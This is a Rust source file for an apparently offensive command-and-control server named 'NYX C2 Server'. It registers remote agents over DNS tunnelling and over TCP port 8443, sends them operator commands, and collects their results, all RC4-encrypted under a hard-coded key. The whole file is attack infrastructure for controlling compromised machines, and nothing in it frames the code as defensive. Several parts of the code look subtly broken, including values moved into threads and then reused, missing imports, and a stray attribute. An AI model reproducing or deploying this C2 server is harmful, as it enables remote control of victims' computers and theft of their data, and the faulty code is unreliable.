use std::io::{Read, Write};
use std::net::{UdpSocket, TcpListener};
use std::time::{Duration, Instant};
use std::thread;
use std::collections::HashMap;
use std::ffi::CString;
use std::ptr;

#[cfg(windows)]
mod winapi {
    use std::os::raw::{c_int, c_void};
    use std::ffi::CString;

    pub const MB_OK: u32 = 0x00000000;
    pub const MB_ICONINFORMATION: u32 = 0x00000040;
    pub const WS_OVERLAPPEDWINDOW: u32 = 0x00CF0000;
    pub const CW_USEDEFAULT: i32 = 0x80000000;

    #[link(name = "user32")]
    extern "system" {
        pub fn MessageBoxA(hWnd: *mut c_void, lpText: *const u8, lpCaption: *const u8, uType: u32) -> c_int;
        pub fn CreateWindowA(lpClassName: *const u8, lpWindowName: *const u8, dwStyle: u32, x: i32, y: i32, nWidth: i32, nHeight: i32, hWndParent: *mut c_void, hMenu: *mut c_void, hInstance: *mut c_void, lpParam: *mut c_void) -> *mut c_void;
        pub fn ShowWindow(hWnd: *mut c_void, nCmdShow: i32) -> bool;
        pub fn UpdateWindow(hWnd: *mut c_void) -> bool;
    }

    pub fn msg_box(title: &str, text: &str) {
        let title_c = CString::new(title).unwrap();
        let text_c = CString::new(text).unwrap();
        unsafe { MessageBoxA(ptr::null_mut(), text_c.as_ptr() as *const u8, title_c.as_ptr() as *const u8, MB_OK | MB_ICONINFORMATION); }
    }

    pub fn create_window(title: &str) -> *mut c_void {
        let class_name = CString::new("STATIC").unwrap();
        let title_c = CString::new(title).unwrap();
        unsafe {
            let hwnd = CreateWindowA(
                class_name.as_ptr() as *const u8,
                title_c.as_ptr() as *const u8,
                WS_OVERLAPPEDWINDOW,
                CW_USEDEFAULT, CW_USEDEFAULT, 800, 600,
                ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), ptr::null_mut()
            );
            ShowWindow(hwnd, 5);
            UpdateWindow(hwnd);
            hwnd
        }
    }
}

const KEY: &[u8] = b"secret";
const DOMAIN: &str = "c2.yourdomain.com";
const HTTPS_PORT: u16 = 8443;

fn rc4(data: &[u8], key: &[u8]) -> Vec<u8> {
    let mut s: Vec<u8> = (0..=255).collect();
    let mut j = 0u8;
    for i in 0..=255 {
        j = j.wrapping_add(s[i as usize]).wrapping_add(key[i % key.len()]);
        s.swap(i as usize, j as usize);
    }
    let mut i = 0u8;
    let mut j = 0u8;
    let mut out = Vec::new();
    for byte in data {
        i = i.wrapping_add(1);
        j = j.wrapping_add(s[i as usize]);
        s.swap(i as usize, j as usize);
        out.push(byte ^ s[(s[i as usize].wrapping_add(s[j as usize])) as usize]);
    }
    out
}

fn dns_handle(socket: UdpSocket, commands: &mut HashMap<String, String>, agents: &mut HashMap<String, Instant>) {
    let mut buf = [0u8; 512];
    loop {
        if let Ok((len, src)) = socket.recv_from(&mut buf) {
            let mut qname = String::new();
            let mut pos = 12;
            while buf[pos] != 0 {
                let len = buf[pos] as usize;
                qname.push_str(str::from_utf8(&buf[pos + 1..pos + 1 + len]).unwrap());
                qname.push('.');
                pos += len + 1;
            }
            qname.pop();
            
            let mut resp = vec![0x00, 0x01, 0x81, 0x80, buf[4], buf[5], 0x00, 0x01, 0x00, 0x00, 0x00, 0x00];
            resp.extend_from_slice(&buf[12..pos + 5]);
            
            if qname.ends_with(DOMAIN) {
                let subdomain = qname[..qname.len() - DOMAIN.len() - 1].to_string();
                if subdomain.starts_with("register.") {
                    let agent_id = subdomain[9..].to_string();
                    agents.insert(agent_id.clone(), Instant::now());
                    #[cfg(windows)]
                    winapi::msg_box("NYX C2 Server", &format!("Agent registered (DNS): {}", agent_id));
                    let txt = hex::encode(rc4(b"OK:dns", KEY));
                    resp.extend_from_slice(&[txt.len() as u8]);
                    resp.extend_from_slice(txt.as_bytes());
                    resp.extend_from_slice(b"\x00\x10\x00\x01\x00\x00\x00\x3c\x00");
                    resp.extend_from_slice(&(txt.len() as u16).to_be_bytes());
                    resp.extend_from_slice(txt.as_bytes());
                } else if subdomain.starts_with("cmd.") {
                    let agent_id = String::from_utf8_lossy(&rc4(&hex::decode(&subdomain[4..]).unwrap_or_default(), KEY)).to_string();
                    let cmd = commands.get(&agent_id).unwrap_or(&"noop".to_string()).clone();
                    #[cfg(windows)]
                    winapi::msg_box("NYX C2 Server", &format!("Sending command (DNS) to {}: {}", agent_id, cmd));
                    let txt = hex::encode(rc4(cmd.as_bytes(), KEY));
                    resp.extend_from_slice(&[txt.len() as u8]);
                    resp.extend_from_slice(txt.as_bytes());
                    resp.extend_from_slice(b"\x00\x10\x00\x01\x00\x00\x00\x3c\x00");
                    resp.extend_from_slice(&(txt.len() as u16).to_be_bytes());
                    resp.extend_from_slice(txt.as_bytes());
                } else if subdomain.starts_with("result.") {
                    let parts: Vec<&str> = subdomain.split('.').collect();
                    let agent_id = parts[1].to_string();
                    let result = String::from_utf8_lossy(&rc4(&hex::decode(parts[2]).unwrap_or_default(), KEY)).to_string();
                    agents.insert(agent_id.clone(), Instant::now());
                    #[cfg(windows)]
                    winapi::msg_box("NYX C2 Server", &format!("Result (DNS) from {}: {}", agent_id, result));
                    let txt = hex::encode(rc4(b"ACK", KEY));
                    resp.extend_from_slice(&[txt.len() as u8]);
                    resp.extend_from_slice(txt.as_bytes());
                    resp.extend_from_slice(b"\x00\x10\x00\x01\x00\x00\x00\x3c\x00");
                    resp.extend_from_slice(&(txt.len() as u16).to_be_bytes());
                    resp.extend_from_slice(txt.as_bytes());
                }
                socket.send_to(&resp, src).ok();
            }
        }
    }
}

fn https_handle(listener: TcpListener, commands: &mut HashMap<String, String>, agents: &mut HashMap<String, Instant>) {
    for stream in listener.incoming() {
        if let Ok(mut stream) = stream {
            let mut buf = [0u8; 1024];
            if let Ok(len) = stream.read(&mut buf) {
                let req = String::from_utf8_lossy(&rc4(&buf[..len], KEY)).to_string();
                let parts: Vec<&str> = req.split_whitespace().collect();
                if parts.len() > 1 {
                    let path = parts[1];
                    if path.starts_with("/register/") {
                        let agent_id = path[10..].to_string();
                        agents.insert(agent_id.clone(), Instant::now());
                        #[cfg(windows)]
                        winapi::msg_box("NYX C2 Server", &format!("Agent registered (HTTPS): {}", agent_id));
                        stream.write_all(&rc4(b"OK:https", KEY)).ok();
                    } else if path.starts_with("/cmd/") {
                        let agent_id = String::from_utf8_lossy(&rc4(&hex::decode(&path[5..]).unwrap_or_default(), KEY)).to_string();
                        let cmd = commands.get(&agent_id).unwrap_or(&"noop".to_string()).clone();
                        #[cfg(windows)]
                        winapi::msg_box("NYX C2 Server", &format!("Sending command (HTTPS) to {}: {}", agent_id, cmd));
                        stream.write_all(&rc4(cmd.as_bytes(), KEY)).ok();
                    } else if path.starts_with("/result/") && parts.len() > 2 {
                        let agent_id = String::from_utf8_lossy(&rc4(&hex::decode(&path[8..]).unwrap_or_default(), KEY)).to_string();
                        let result = String::from_utf8_lossy(&rc4(&hex::decode(parts[2]).unwrap_or_default(), KEY)).to_string();
                        agents.insert(agent_id.clone(), Instant::now());
                        #[cfg(windows)]
                        winapi::msg_box("NYX C2 Server", &format!("Result (HTTPS) from {}: {}", agent_id, result));
                        stream.write_all(&rc4(b"ACK", KEY)).ok();
                    }
                }
            }
        }
    }
}

fn main() {
    let dns_socket = UdpSocket::bind("0.0.0.0:53").expect("DNS bind failed");
    let https_listener = TcpListener::bind(format!("0.0.0.0:{}", HTTPS_PORT)).expect("HTTPS bind failed");
    
    let mut commands: HashMap<String, String> = HashMap::new();
    let mut agents: HashMap<String, Instant> = HashMap::new();
    
    #[cfg(windows)]
    let _hwnd = winapi::create_window("NYX C2 Server Console");
    #[cfg(windows)]
    winapi::msg_box("NYX C2 Server", "Server started. Use console to register commands.");
    
    thread::spawn(move || dns_handle(dns_socket, &mut commands, &mut agents));
    thread::spawn(move || https_handle(https_listener, &mut commands, &mut agents));
    
    println!("NYX C2 Server GUI running on Windows (DNS: 53, HTTPS: {})", HTTPS_PORT);
    println!("Commands: register <agent_id> <cmd>, list");
    
    let mut input = String::new();
    loop {
        input.clear();
        std::io::stdin().read_line(&mut input).unwrap();
        let parts: Vec<&str> = input.trim().split_whitespace().collect();
        match parts.get(0) {
            Some(&"register") if parts.len() >= 3 => {
                let agent_id = parts[1].to_string();
                let cmd = parts[2..].join(" ");
                commands.insert(agent_id.clone(), cmd.clone());
                #[cfg(windows)]
                winapi::msg_box("NYX C2 Server", &format!("Registered {} with command: {}", agent_id, cmd));
            },
            Some(&"list") => {
                let list = format!("Commands: {:?}", commands);
                #[cfg(windows)]
                winapi::msg_box("NYX C2 Server", &list);
                println!("{}", list);
            },
            _ => #[cfg(windows)]
                winapi::msg_box("NYX C2 Server", "Usage: register <agent_id> <cmd>, list"),
        }
    }
}
